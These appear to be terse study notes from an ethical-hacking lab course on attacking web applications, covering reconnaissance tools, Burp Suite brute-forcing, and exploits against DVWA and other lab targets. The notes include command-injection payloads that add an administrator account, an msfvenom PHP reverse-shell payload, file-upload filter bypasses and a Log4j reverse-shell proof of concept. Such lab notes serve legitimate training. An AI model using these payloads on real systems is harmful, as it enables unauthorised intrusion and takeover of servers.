# Hacking webapplication

## Footprint the web infrastructure

- Perform web application reconnaissance using **Nmap** and **Telnet**  
`nmap -T4 -A -v [Target Web Application]`  
telnet www.moviescope.com 80  
    GET / HTTP/1.0

- Perform web application reconnaissance using **WhatWeb**  
    `whatweb -v [target web application]`

- Perform web spidering using **OWASP ZAP**  
    zaproxy --> Automated Scan  
    Spider - Active Scan - Alerts

- Detect load balancers using various tools  
    `dig yahoo.com`  
    `lbd yahoo.com`

- Identify web server directories using various tools  
    `nmap -sV --script=http-enum [target domain or IP address]`  
    `gobuster dir -u [Target Website] -w/home/attacker/Desktop/common.txt`  
    `python3 dirsearch.py -u http://www.moviescope.com`  
        -e extension  
        -x 403

- Perform web application vulnerability scanning using **Vega**  
    windows application  
    Start new scan

- Identify clickjacking vulnerability using **ClickjackPoc**  
    `python3 clickJackPoc.py -f domain.txt`

## Perform web application attacks

- Perform a brute-force attack using **Burp Suite**  
    1. Intruder
    2. Position -> clear
    3. Cluster bomb
    4. Add § before and after value
    5. Payloads -> Load

- Perform parameter tampering using **Burp Suite**
    Proxy -> Intercept

- Identify XSS vulnerabilities in web applications using **PwnXSS**
    <https://github.com/pwn0sec/PwnXSS>  
    `python3 pwnxss.py -u http://testphp.vulnweb.com`

- Exploit parameter tampering and XSS vulnerabilities in web applications  
    XSS payload: <script>alert("test")</script>

- Perform cross-site request forgery (CSRF) attack
    leekme plugin for wordpress

- Enumerate and hack a web application using **WPScan** and **Metasploit**  
    `wpscan --api-token [API Token] --url http://10.10.1.22:8080/CEH --enumerate u`  

    `use auxiliary/scanner/http/wordpress_login_enum`

- Exploit a remote command execution vulnerability to compromise a target web server  
    <https://github.com/digininja/DVWA>

```bash
lowering to low or medium DVWA
| hostname
| whoami
| tasklist
| Taskkill /PID [Process ID value of the desired process] /F
| dir C:\
| net user
| net user Test /Add
| net localgroup Administrators Test /Add
```

hard not use space after pipe

- Exploit a file upload vulnerability at different security levels  
    `msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine]LPORT=4444 -f raw`  

    EASY:  
    create a file  
    <http://10.10.1.22:8080//dvwa/hackable/uploads/upload.php>  

    MEDIUM:  
    as previous upload medium.php.jpg rename in burp to medium.php  

    HIGH:  
    FILE UPLOAD: add GIF98 before the payload save as jpeg  
    COMMAND INJECTION: |copy C:\wamp64\www\DVWA\hackable\uploads\high.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php  

- Gain access by exploiting Log4j vulnerability  
    `docker build -t log4j-shell-poc .`
    `python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001`

## Detect Web Application Vulnerabilities using Various Web Application Security Tools

- Detect web application vulnerabilities using **N-Stalker** Web Application Security Scanner  
    windows software
